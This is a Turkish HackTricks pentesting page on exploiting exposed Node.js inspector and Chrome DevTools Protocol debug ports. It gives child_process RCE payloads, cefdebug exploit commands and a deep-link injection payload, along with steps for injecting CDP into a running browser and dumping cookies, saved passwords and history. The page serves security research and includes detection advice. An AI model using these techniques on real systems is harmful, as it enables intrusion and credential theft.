# Node inspector/CEF debug suistimali

{{#include ../../banners/hacktricks-training.md}}

Geçmişteki pratik örnekler arasında Multimaster walkthrough ve CVE-2019-1414 Visual Studio Code debugger saldırısı yer alır; bunları, günümüzdeki her Electron veya Chromium hedefinin aynı temel özellikleri sunduğunu varsaymak yerine, sürüme özgü bağlam olarak değerlendirin.<sup>[[1]](#references)[[3]](#references)</sup>

## Temel Bilgiler

[Belgelerden](https://nodejs.org/learn/getting-started/debugging): `--inspect` anahtarıyla başlatıldığında, bir Node.js süreci bir debug istemcisinden gelen bağlantıları dinler. **Varsayılan olarak** **`127.0.0.1:9229`** ana bilgisayar adresinde ve bağlantı noktasında dinleme yapar. Her sürece ayrıca **benzersiz** bir **UUID** atanır.<sup>[[4]](#references)</sup>

Inspector istemcilerinin bağlanmak için ana bilgisayar adresini, bağlantı noktasını ve UUID'yi bilmesi ve belirtmesi gerekir. Tam URL şu biçimde görünür: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> **Debugger, Node.js yürütme ortamına tam erişime sahip olduğundan**, bu bağlantı noktasına bağlanabilen kötü niyetli bir aktör, Node.js süreci adına keyfi kod çalıştırabilir (**olası ayrıcalık yükseltme**).<sup>[[4]](#references)</sup>

Inspector'ı başlatmanın birkaç yolu vardır:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

İncelenen bir süreci başlattığınızda şöyle bir şey görünür:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

**CEF** (**Chromium Embedded Framework**) kullanan süreçler, `--remote-debugging-port=9222` ile bir debugger açığa çıkarabilir. Bu, tarayıcıyı Node.js inspector yerine [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden açığa çıkarır; bu nedenle Node.js `process` tabanlı payload'lar varsayılan olarak doğrudan uygulanamaz.<sup>[[2]](#references)[[5]](#references)</sup>

Debug modunda bir tarayıcı başlattığınızda şöyle bir şey görünür:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDP endpoint'ini listeleme ve kullanma

HTTP keşif endpoint'leri **browser** WebSocket'i ile tek tek **target** (tab, worker, extension vb.) WebSocket'lerini birbirinden ayırır. Browser endpoint'i için `/json/version`, target'lar için `/json/list` sorgulanır; döndürülen `webSocketDebuggerUrl` değerleri, CDP'nin JSON-RPC benzeri mesajlarıyla doğrudan kullanılabilir.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Örneğin, `websocat "$BROWSER_WS"` ile bağlanıp `{"id":1,"method":"Target.getTargets"}` veya `{"id":2,"method":"Storage.getCookies"}` gönderin. Bir sayfa hedefinde (`websocat "$PAGE_WS"`), `Runtime.evaluate` ilgili renderer'da kod çalıştırır ve `Page.captureScreenshot` base64 kodlu bir ekran görüntüsü döndürür. `document.cookie`, `HttpOnly` çerezleri gösteremez; `Storage.getCookies` ise tarayıcıdan çerez deposunu sorgular.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Tarayıcılar, WebSocket'ler ve same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web tarayıcısında açılan web siteleri, tarayıcı güvenlik modeli kapsamında WebSocket ve HTTP istekleri gönderebilir. **Benzersiz bir debugger session id almak** için **ilk bir HTTP bağlantısı** gerekir. **Same-origin policy**, web sitelerinin **bu HTTP bağlantısını** kurmasını **engeller**. [**DNS rebinding saldırılarına**](https://en.wikipedia.org/wiki/DNS_rebinding)** karşı** ek bir güvenlik önlemi olarak Node.js, bağlantının **'Host' başlıklarının** ya bir **IP adresi** ya da tam olarak **`localhost`** belirttiğini doğrular.<sup>[[4]](#references)</sup>

> [!TIP]
> Bu **güvenlik önlemleri,** yalnızca **bir HTTP isteği göndererek** (SSRF açığından yararlanılarak yapılabilir) kod çalıştırmak için **inspector'dan yararlanılmasını engeller**.<sup>[[4]](#references)</sup>

### Çalışan süreçlerde inspector'ı başlatma

Çalışan bir Node.js sürecine **SIGUSR1 sinyalini** göndererek **inspector'ı** varsayılan portta başlatmasını sağlayabilirsiniz. Ancak yeterli ayrıcalıklara sahip olmanız gerektiğini unutmayın; bu, **süreç içindeki bilgilere ayrıcalıklı erişim** sağlayabilir ancak doğrudan bir ayrıcalık yükseltmesi sağlamaz.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Bu, container'larda kullanışlıdır çünkü `--inspect` ile **process'i kapatıp yenisini başlatmak** bir **seçenek değildir**; process ile birlikte **container** da **sonlandırılır**.<sup>[[6]](#references)</sup>

### Inspector/debugger'a bağlanma

**Chromium tabanlı bir browser**'a bağlanmak için Chrome veya Edge'de sırasıyla `chrome://inspect` ya da `edge://inspect` URL'lerine erişilebilir. Configure düğmesine tıklayarak **hedef host ve portun** doğru şekilde listelendiğinden emin olun. Görselde bir Remote Code Execution (RCE) örneği gösterilmektedir:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger'a erişmek için bir URL görünecektir. Örneğin: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Inspector/debugger'a bağlanma: Chromium tabanlı bir browser'a bağlanmak için,...](<../../images/image (674).png>)

**Command line** kullanarak bir debugger/inspector'a şu şekilde bağlanabilirsiniz:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) aracı, yerel olarak çalışan **inspector'ları bulmaya** ve bunlara **kod enjekte etmeye** olanak tanır.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden bir tarayıcıya bağlanıldığında **NodeJS RCE exploit'lerinin çalışmayacağını** unutmayın (ilginç şeyler yapmak için API'yi incelemeniz gerekir).<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector'da RCE

> [!TIP]
> Buraya [**Electron'da bir XSS'ten RCE elde etmenin yolunu arayarak geldiyseniz bu sayfaya göz atın.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Bir Node **inspector**'a **bağlanabildiğinizde** **RCE** elde etmenin yaygın yollarından biri şuna benzer bir şey kullanmaktır (görünüşe göre **Chrome DevTools Protocol'e bağlanıldığında bu çalışmaz**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payload'ları

API'yi buradan inceleyebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Bu bölümde, insanların bu protokolü istismar etmek için kullandığını gördüğüm ilginç yöntemleri listeleyeceğim.

### Chrome 136+ varsayılan profil kısıtlaması

**Chrome 136** sürümünden itibaren Chrome, **varsayılan Chrome veri dizinini** hedeflediklerinde `--remote-debugging-port` ve `--remote-debugging-pipe` seçeneklerini yok sayar. Bu seçeneğin, ayrı bir şifreleme anahtarına ve yalıtılmış tarayıcı durumuna sahip standart dışı bir `--user-data-dir` ile birlikte kullanılması gerekir; böylece basit bayrak tabanlı yöntem, kullanıcının normal kimliği doğrulanmış profilini açığa çıkaramaz. Doğrulama yapılmadan, Chrome'a özgü bu kısıtlamanın eski Chrome sürümlerini, Chrome for Testing'i, Electron/CEF uygulamalarını veya diğer Chromium türevlerini de kapsadığı varsayılmamalıdır.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Dolayısıyla, yalnızca `--remote-debugging-port` ile başlatılmış çalışan bir Chrome süreci görmek, CDP'nin etkinleştiğini **kanıtlamaz**. Listener'ı ve `/json/version`'ı doğrulayın ve hangi profilin bunu kullandığını belirleyin.<sup>[[14]](#references)</sup>

### Deep Links Üzerinden Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kapsamında Rhino Security, CEF tabanlı bir uygulamanın sistemde özel bir URI (`workspaces://index.html`) **kaydettiğini** keşfetti. Bu URI, kendisine iletilen URI'nin tamamını alıyor ve ardından bu URI'den kısmen oluşturulan bir yapılandırmayla CEF tabanlı uygulamayı **başlatıyordu**.<sup>[[8]](#references)</sup>

URI parametrelerinin URL decode işleminden geçirildiği ve CEF tabanlı uygulamayı başlatmak için kullanıldığı keşfedildi. Bu da bir kullanıcının komut satırına **`--gpu-launcher`** flag'ini **enjekte etmesine** ve rastgele işlemler yürütmesine olanak tanıyordu.<sup>[[8]](#references)</sup>

Yani, şöyle bir payload:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

calc.exe'yi çalıştırır.<sup>[[8]](#references)</sup>

### Dosyaların Üzerine Yazma

**İndirilen dosyaların kaydedileceği** klasörü değiştirin ve uygulamanın sık kullanılan **kaynak kodunun** üzerine **kötü amaçlı kodunuzu** yazmak için bir dosya indirin.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE ve exfiltration

STAR Labs, açığa çıkarılmış WebDriver/CDP servislerinin rastgele dosya okumayı ve RCE'yi mümkün kılabileceğini gösterdi; bazı yapılandırmalarda DNS rebinding exploit zincirini tamamlayabilir.<sup>[[9]](#references)</sup>

ChromeDriver'ın WebDriver servisi, Chrome DevTools/CDP'den farklıdır. [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities), yeni bir session için başlatılacak tarayıcı executable'ını seçer. Ayrıcalıksız bir caller, root olarak çalışan bir ChromeDriver servisine erişebiliyor ve caller tarafından kontrol edilen bir executable path ile session gönderebiliyorsa, bu başlatma servisin ayrıcalık sınırını aşabilir. Boş bir `/sessions` yanıtı, yeni session'ların oluşturulup oluşturulamayacağını kesinleştirmez. Bu yolun kullanılabilir olduğu sonucuna varmadan önce process sahibini, gerçek listener erişilebilirliğini, session authorization'ı, executable erişimini ve confinement'ı inceleyin; yalnızca process adı veya yaygın olarak kullanılan bir port yeterli değildir. [Google'ın güvenlik rehberi](https://developer.chrome.com/docs/chromedriver/security-considerations), ChromeDriver'ın ayrıcalıksız bir hesapla çalıştırılmasını önerir. Pasif enumeration, WebDriver session'ı oluşturmamalıdır.

Tarihî browser-automation ve Chromium güvenlik örnekleri için Counter WebDriver yazısına ve Project Zero'nun 773, 1742 ve 1944 numaralı issue'larına bakın.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Çalışan bir Chromium process'inde CDP'yi etkinleştirme

Chrome'un varsayılan profil kısıtlaması yalnızca komut satırından etkinleştirme yolunu engeller. Browser process'ini değiştirmek için yeterli same-user erişimiyle, orijinal [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) ve Cobalt Strike [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF), Chromium'un dışa aktarılmamış `content::DevToolsAgentHost::StartRemoteDebuggingServer` fonksiyonunu hâlihazırda çalışan `chrome.exe` veya `msedge.exe` içinde çağırır. Böylece endpoint gerçek profile ait olur ve sekmeler, extensions, cookies ile kimliği doğrulanmış durum korunur.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Standart x64 Chrome/Edge process'lerinde BOF, browser window'ını ve yüklenmiş `chrome.dll`/`msedge.dll` dosyasını bulur, remote PE'yi maskelenmiş signatures için tarar, stubs ve bir context block ayırır, window procedure'ü geçici olarak değiştirir ve son çağrıyı browser'ın **UI thread**'inde yürütür. İlgili runtime girdileri `StartRemoteDebuggingServer`, Chromium'un `operator new` fonksiyonu, `TCPServerSocketFactory::CreateForHttpServer` ve factory vtable'ıdır. Zorunlu signatures'lardan herhangi biri tekil bir eşleşme bulamazsa yürütme durur.<sup>[[15]](#references)[[16]](#references)</sup>

BOF, bir browser mode ve isteğe bağlı port kabul eder. Ardından yardımcı script endpoint'i doğrulayabilir ve cookies toplayabilir; `chrome-iso`, Chrome'un Windows Process Isolation sınırı için ayrı bir yoldur.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

`chrome-iso` yolu, yalıtılmış sürece yalnızca sorguyla sınırlı handle'lar kullanarak erişir. Canlı süreçle aynı PE image size değerine sahip kurulu `chrome.dll` dosyasını belirler, sembolleri bu yerel image'dan çözümler ve UI thread'ine ulaşmak için Chromium'un `WindowImpl` dispatch mekanizmasını, senkron `WM_COPYDATA` mesajlarını ve mevcut bir image'daki User32 hook'unu kullanır.<sup>[[16]](#references)</sup>

> [!WARNING]
> Bu, **browser sürecine sızıldıktan sonra yapılan bir manipülasyon** tekniğidir; kimlik doğrulama gerektirmeyen bir ağ bypass'ı değildir. İlgili C++ sembolleri export edilmediğinden ve browser güncellemelerinden sonra değişebildiğinden, tekniğin çalışması kullanılan build'e bağlıdır.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Browser güncellemelerinden sonra signature'ları yenileme

Hedefte kurulu `chrome.dll` veya `msedge.dll` dosyasının tam sürümünü ve buna karşılık gelen PDB'yi kullanın. Windows SDK'daki `symchk.exe` sembolleri indirir; ardından repository script'leri `StartRemoteDebuggingServer` fonksiyonunu bulur, allocator/socket-factory girdilerini belirler veya BOF'a gömülü tüm signature'ları doğrular.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Sıfır eşleşme veya birden fazla eşleşme sonucu, rastgele bir adresle değiştirilmemelidir. Bilinen bir `operator new` veya `CreateForHttpServer` pattern'i yeni bir mask oluşturmak için fazla değiştiyse, bu sembolü incelemek ve hedef modülde benzersiz olan bir byte dizisi türetmek için PDB ile `pe_signature_finder.py` kullanın.<sup>[[16]](#references)[[18]](#references)</sup>

#### CDP Toolkit ile kimliği doğrulanmış tarayıcıdan veri çıkarma

Bu teknik, App-Bound Encryption (ABE) şifrelemesini çevrimdışı çözmez veya cihaz bağlamasını kaldırmaz. Bunun yerine, meşru tarayıcıyı **bir şifre çözme oracle'ı ve kimliği doğrulanmış etkileşim proxy'si** olarak kullanır: `Storage.getCookies`, canlı tarayıcıdan çerez deposunu isterken gezinme/screencast iş akışları istekleri, depolamayı, kurumsal kimlik doğrulamayı ve cihaza bağlı davranışı kurbanın mevcut tarayıcısında tutar.<sup>[[17]](#references)[[18]](#references)</sup>

Loopback CDP dinleyicisini operatörün pivot'u üzerinden yönlendirdikten sonra, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) yaygın artifact'leri sıralayıp toplayabilir.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` ve `tabs screenshot`, çoğunlukla `/json/version`, target list, `Storage.getCookies` ve `Page.captureScreenshot` için kullanılan wrapper'lardır. History, bookmarks, extensions ve password metadata ise geçici bir `chrome://`/`edge://` WebUI target'ı gerektirir: toolkit, arayüzün render edilmesini bekler, modelini veya DOM'unu inceler, sonucu toplar ve target'ı kapatır.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` daha ileri gider: gerçek kayıtlı giriş origin'ini açar, bir credential alanına odaklanır, CDP input events kullanarak yerel autofill önerisini seçer ve doldurulan değerleri okur. Origin/port/path, kayıtlı password realm ile yakından eşleşmelidir; öneri popup'ı yerel browser UI olduğundan, varsayılan olarak görünür mod en güvenilir seçenektir.<sup>[[17]](#references)[[18]](#references)</sup>

Canlı etkileşim için `browser-takeover screencast`, gerçek bir target'a (background veya off-screen modları dahil) frame akışı gönderir ve input iletir. `browser-takeover proxy` ise yerel olarak HTTP ve HTTPS `CONNECT` isteklerini kabul eder ve upstream istekleri gizli Chrome target'ları üzerinden gönderir; gizli target'ların kullanılamadığı durumlarda background tabs'e geçer. Bu yöntem, kurbanın network/authentication context'ini korur; ancak döndürülen içeriği operatörün browser'ı render ettiğinden, karmaşık client-side uygulamalarda aslına daha az sadıktır.<sup>[[17]](#references)[[18]](#references)</sup>

Detection için yalnızca `--remote-debugging-*` command-line telemetry'ye güvenmeyin: ayrıca browser process'lerine yönelik olağandışı handle ve memory işlemlerini (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection'ı ve Chrome/Edge'e ait beklenmedik loopback listening socket'lerini ilişkilendirin.<sup>[[15]](#references)</sup>

### Sömürü Sonrası

Gerçek bir ortamda, Chromium tabanlı browser kullanan bir kullanıcı PC'sini **ele geçirdikten sonra**, geçmişte kullanılan bir teknik, debugging etkinleştirilmiş şekilde browser'ı yeniden başlatıp loopback portunu forward etmekti. Bu, seçilen profile hâlâ izin veren ürünlerde/sürümlerde kurbanın browsing state'ini açığa çıkarabilir; ancak Chrome 136+, varsayılan data directory'sine karşı bu yöntemi kabul etmez.<sup>[[7]](#references)[[14]](#references)</sup>

Orijinal yeniden başlatma komutu, eski/sürüme özgü target'lar için aşağıda korunmuştur. İkinci komut, güncel Chrome'da desteklenen biçimdir; ancak kurbanın normal authenticated state'ini yeniden açmak yerine izole bir profile oluşturur.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

macOS'e özgü Chromium'u yeniden başlatma, extension ve CDP tradecraft'i için bkz. [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium hata ayıklayıcı inceleme ve exploitation aracı](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger üzerinden Visual Studio Code'da uzaktan kod yürütme](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Hata Ayıklama Kılavuzu - Başlarken](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Uzaktaki tarama oturumlarını gözlemlemek ve kontrol etmek için Chrome'un hata ayıklama özelliğini kötüye kullanma](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces'ta uzaktan kod yürütme](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Benimle mi konuşuyorsun? - DNS Rebinding ve CDP üzerinden WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Webdriver'ı alt etmek - Bottan RCE'ye](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Sorunu 773 (Chromium hata izleyicisi)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Sorunu 1742 (Chromium hata izleyicisi)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Sorunu 1944 (Chromium hata izleyicisi)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Güvenliği artırmak için uzaktan hata ayıklama anahtarlarında yapılan değişiklikler - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Çalışan bir Edge tarayıcısına CDP enjekte etme: Çalışma zamanı tarayıcı enstrümantasyonuna derinlemesine bakış](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Cookie Monster'ın Dönüşü](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
